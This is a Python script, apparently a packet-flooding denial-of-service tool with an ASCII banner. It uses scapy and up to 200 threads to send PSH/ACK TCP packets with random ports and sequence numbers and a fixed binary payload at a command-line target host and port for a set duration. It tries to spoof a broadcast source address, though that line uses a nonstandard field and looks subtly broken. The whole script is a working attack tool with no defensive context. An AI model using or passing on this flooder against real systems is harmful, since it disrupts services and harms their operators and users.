import threading, sys, os, time
from random import randint
from scapy.all import *

def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        try:
            ip = IP(str="255.255.255.255", dst=host)
            tcp = TCP(sport=RandShort(), dport=int(port), flags="PS", seq=RandShort(), ack=RandShort())
            raw = Raw("\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94")
            send(ip/tcp/raw, verbose=0)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$$$$$$  /$$        /$$$$$$  /$$$$$$$$ /$$$$$$ /$$   /$$  /$$$$$$          /$$$$$$$$ /$$$$$$   /$$$$$$  /$$$$$$$$
            | $$                | $$          | $$__  $$| $$       /$$__  $$|_____ $$ |_  $$_/| $$$ | $$ /$$__  $$        | $$_____//$$__  $$ /$$__  $$|__  $$__/
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  \ $$| $$      | $$  \ $$     /$$/   | $$  | $$$$| $$| $$  \__/        | $$     | $$  \ $$| $$  \__/   | $$   
            | $$      | $$  | $$| $$|____ /$$/| $$$$$$$ | $$      | $$$$$$$$    /$$/    | $$  | $$ $$ $$| $$ /$$$$ /$$$$$$| $$$$$  | $$$$$$$$|  $$$$$$    | $$   
            | $$      | $$  | $$| $$   /$$$$/ | $$__  $$| $$      | $$__  $$   /$$/     | $$  | $$  $$$$| $$|_  $$|______/| $$__/  | $$__  $$ \____  $$   | $$   
            | $$      | $$  | $$| $$  /$$__/  | $$  \ $$| $$      | $$  | $$  /$$/      | $$  | $$\  $$$| $$  \ $$        | $$     | $$  | $$ /$$  \ $$   | $$   
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$$$$$$/| $$$$$$$$| $$  | $$ /$$$$$$$$ /$$$$$$| $$ \  $$|  $$$$$$/        | $$     | $$  | $$|  $$$$$$/   | $$   
            |________/ \______/ |__/|________/|_______/ |________/|__/  |__/|________/|______/|__/  \__/ \______/         |__/     |__/  |__/ \______/    |__/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')